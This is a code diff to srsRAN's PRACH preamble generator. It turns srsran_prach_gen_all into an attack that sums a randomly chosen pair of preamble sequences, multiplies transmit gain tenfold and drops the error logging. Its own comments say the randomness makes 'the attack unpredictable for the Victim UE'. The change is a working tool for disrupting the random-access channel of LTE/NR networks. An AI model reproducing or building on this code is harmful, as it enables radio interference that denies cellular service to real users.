@@ -28,6 +28,7 @@
 #include "srsran/phy/phch/prach.h"
 #include "srsran/phy/utils/debug.h"
 #include "srsran/phy/utils/vector.h"
+#include <stdlib.h> // For rand()
 
 #include "prach_tables.h"
 
@@ -792,6 +793,51 @@ int srsran_prach_gen(srsran_prach_t* p, uint32_t seq_index, uint32_t freq_offset
   return ret;
 }
 
+/* int srsran_prach_gen_all(srsran_prach_t* p, uint32_t freq_offset, cf_t* signal) */
+/* { */
+/*   int ret = SRSRAN_ERROR; */
+/**/
+/*   if (p != NULL && signal != NULL) { */
+/*     uint32_t N_rb_ul = srsran_nof_prb(p->N_ifft_ul); */
+/*     uint32_t k_0     = freq_offset * N_RB_SC - N_rb_ul * N_RB_SC / 2 + p->N_ifft_ul / 2; */
+/*     uint32_t K       = DELTA_F / DELTA_F_RA; */
+/*     uint32_t begin   = PHI + (K * k_0) + (p->is_nr ? 0 : (K / 2)); */
+/**/
+/*     if (6 + freq_offset > N_rb_ul) { */
+/*       ERROR("Error no space for PRACH: frequency offset=%d, N_rb_ul=%d", freq_offset, N_rb_ul); */
+/*       return ret; */
+/*     } */
+/**/
+/*     srsran_vec_cf_zero(p->ifft_in, p->N_ifft_prach); */
+/**/
+/*     for (uint32_t i = 0; i < 6; i++) { */
+/*       int   index_val     = i * 5; */
+/*       cf_t* sequence_data = get_precoded_dft(p, index_val); */
+/**/
+/*       for (int k = 0; k < p->N_zc; k++) { */
+/*         p->ifft_in[begin + k] += sequence_data[k]; */
+/*       } */
+/*     } */
+/**/
+/*     srsran_dft_run(&p->ifft, p->ifft_in, p->ifft_out); */
+/**/
+/*     float volume_knob = 1.0f / 5.0f; */
+/*     for (int k = 0; k < p->N_ifft_prach; k++) { */
+/*       p->ifft_out[k] *= volume_knob; */
+/*     } */
+/**/
+/*     memcpy(signal, &p->ifft_out[p->N_ifft_prach - p->N_cp], p->N_cp * sizeof(cf_t)); */
+/**/
+/*     for (int i = 0; i < p->N_seq; i++) { */
+/*       signal[p->N_cp + i] = p->ifft_out[i % p->N_ifft_prach]; */
+/*     } */
+/**/
+/*     ret = SRSRAN_SUCCESS; */
+/*   } */
+/**/
+/*   return ret; */
+/* } */
+
 int srsran_prach_gen_all(srsran_prach_t* p, uint32_t freq_offset, cf_t* signal)
 {
   int ret = SRSRAN_ERROR;
@@ -802,30 +848,39 @@ int srsran_prach_gen_all(srsran_prach_t* p, uint32_t freq_offset, cf_t* signal)
     uint32_t K       = DELTA_F / DELTA_F_RA;
     uint32_t begin   = PHI + (K * k_0) + (p->is_nr ? 0 : (K / 2));
 
-    if (6 + freq_offset > N_rb_ul) {
-      ERROR("Error no space for PRACH: frequency offset=%d, N_rb_ul=%d", freq_offset, N_rb_ul);
+    if (6 + freq_offset > N_rb_ul)
       return ret;
-    }
 
     srsran_vec_cf_zero(p->ifft_in, p->N_ifft_prach);
 
-    for (uint32_t i = 0; i < 2; i++) {
-      cf_t* sequence_data = get_precoded_dft(p, i);
+    // --- CHAOS LOGIC (Randomization) ---
+    // Instead of rotating 0,1,2... we pick a random start point (0-31).
+    // This makes the attack unpredictable for the Victim UE.
+    uint32_t random_seed = rand() % 32;
 
-      for (int k = 0; k < p->N_zc; k++) {
-        p->ifft_in[begin + k] += sequence_data[k];
-      }
+    // Pair 1: Random Index
+    // Pair 2: Random Index + 32 (Max Spacing)
+    uint32_t idx_1 = random_seed;
+    uint32_t idx_2 = random_seed + 32;
+
+    // --- GENERATE PAIR ---
+    cf_t* seq1 = get_precoded_dft(p, idx_1);
+    cf_t* seq2 = get_precoded_dft(p, idx_2);
+
+    for (int k = 0; k < p->N_zc; k++) {
+      // Sum the two signals
+      p->ifft_in[begin + k] = seq1[k] + seq2[k];
     }
 
     srsran_dft_run(&p->ifft, p->ifft_in, p->ifft_out);
 
-    float volume_knob = 1.0f / 5.0f;
+    float power_ctrl = 2.0f;
+
     for (int k = 0; k < p->N_ifft_prach; k++) {
-      p->ifft_out[k] *= volume_knob;
+      p->ifft_out[k] *= power_ctrl;
     }
 
     memcpy(signal, &p->ifft_out[p->N_ifft_prach - p->N_cp], p->N_cp * sizeof(cf_t));
-
     for (int i = 0; i < p->N_seq; i++) {
       signal[p->N_cp + i] = p->ifft_out[i % p->N_ifft_prach];
     }
